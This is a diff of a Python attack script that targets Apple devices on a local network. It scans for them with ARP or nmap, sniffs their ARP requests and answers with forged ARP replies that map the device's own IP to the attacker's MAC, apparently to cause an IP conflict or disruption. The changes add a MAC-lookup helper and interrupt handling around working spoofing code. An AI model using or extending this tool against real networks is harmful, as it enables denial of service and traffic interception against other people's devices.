@@ -5,12 +5,16 @@ from sys import path
 from os.path import dirname, abspath
 project_root_path = dirname(dirname(dirname(abspath(__file__))))
 utils_path = project_root_path + "/Utils/"
+scripts_arp_path = project_root_path + "/Scripts/ARP"
+
 path.append(utils_path)
+path.append(scripts_arp_path)
 
 from base import Base
 from scanner import Scanner
 from network import ARP_raw
 from tm import ThreadManager
+from arp_scan import ArpScan
 from argparse import ArgumentParser
 from ipaddress import IPv4Address
 from scapy.all import Ether, ARP, DHCP, sniff
@@ -21,6 +25,7 @@ from time import sleep
 # region Check user, platform and print banner
 Base = Base()
 Scanner = Scanner()
+ArpScan = ArpScan()
 arp = ARP_raw()
 Base.check_user()
 Base.check_platform()
@@ -95,7 +100,7 @@ def send_arp_reply():
                                   sender_mac=your_mac_address, sender_ip=apple_device[0],
                                   target_mac=apple_device[1], target_ip=apple_device[0])
     socket_global.send(arp_reply)
-    Base.print_info("ARP response to:   ", apple_device[1], " \"",
+    Base.print_info("ARP response to:  ", apple_device[1], " \"",
                     apple_device[0] + " is at " + your_mac_address, "\"")
 # endregion
 
@@ -109,7 +114,7 @@ def sniffer_prn(request):
         if request[ARP].op == 1:
             if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
                 if request[ARP].pdst == apple_device[0]:
-                    Base.print_info("ARP request from:  ", request[Ether].src, " \"",
+                    Base.print_info("ARP request from: ", request[Ether].src, " \"",
                                     "Who has " + request[ARP].pdst + "? Tell " + request[ARP].psrc, "\"")
                     send_arp_reply()
     # endregion
@@ -136,47 +141,51 @@ def sniffer():
 
 # region Main function
 if __name__ == "__main__":
+    try:
+        # region Find Apple devices in local network with ArpScan or nmap
+        if args.target_ip is None:
+            if not args.nmap_scan:
+                Base.print_info("ARP scan is running ...")
+                apple_devices = Scanner.find_apple_devices_by_mac(listen_network_interface)
+            else:
+                Base.print_info("NMAP scan is running ...")
+                apple_devices = Scanner.find_apple_devices_with_nmap(listen_network_interface)
 
-    # region Find Apple devices in local network with ArpScan or nmap
-    if args.target_ip is None:
-        if not args.nmap_scan:
-            Base.print_info("ARP scan is running ...")
-            apple_devices = Scanner.find_apple_devices_by_mac(listen_network_interface)
-        else:
-            Base.print_info("NMAP scan is running ...")
-            apple_devices = Scanner.find_apple_devices_with_nmap(listen_network_interface)
+            apple_device = Scanner.apple_device_selection(apple_devices)
+        # endregion
 
-        apple_device = Scanner.apple_device_selection(apple_devices)
-    # endregion
+        # region Find Mac address of Apple device if target IP is set
+        if args.target_ip is not None:
+            Base.print_info("Find MAC address of Apple device with IP address: ", target_ip, " ...")
+            target_mac = ArpScan.get_mac_address(listen_network_interface, target_ip)
+            if target_mac == "ff:ff:ff:ff:ff:ff":
+                Base.print_error("Could not find device MAC address with IP address: ", target_ip)
+                exit(1)
+            else:
+                apple_device = [target_ip, target_mac]
+        # endregion
 
-    # region Find Mac address of Apple device if target IP is set
-    if args.target_ip is not None:
-        Base.print_info("Find MAC address of Apple device with IP address: ", target_ip, " ...")
-        target_mac = Base.get_mac(listen_network_interface, target_ip)
-        if target_mac == "ff:ff:ff:ff:ff:ff":
-            Base.print_error("Could not find device MAC address with IP address: ", target_ip)
-            exit(1)
-        else:
-            apple_device = [target_ip, target_mac]
-    # endregion
+        # region Output target IP and MAC address
+        Base.print_info("Target: ", apple_device[0] + " (" + apple_device[1] + ")")
+        # endregion
 
-    # region Output target IP and MAC address
-    Base.print_info("Target: ", apple_device[0] + " (" + apple_device[1] + ")")
-    # endregion
+        # region Start sniffer
+        tm = ThreadManager(2)
+        tm.add_task(sniffer)
+        # endregion
 
-    # region Start sniffer
-    tm = ThreadManager(2)
-    tm.add_task(sniffer)
-    # endregion
+        # region Send first ARP reply
+        sleep(5)
+        Base.print_warning("Send first (init) ARP reply ...")
+        send_arp_reply()
+        # endregion
 
-    # region Send first ARP reply
-    sleep(5)
-    Base.print_warning("Send first (init) ARP reply ...")
-    send_arp_reply()
-    # endregion
+        # region Wait for completion
+        tm.wait_for_completion()
+        # endregion
 
-    # region Wait for completion
-    tm.wait_for_completion()
-    # endregion
+    except KeyboardInterrupt:
+        Base.print_info("Exit")
+        exit(0)
 
 # endregion
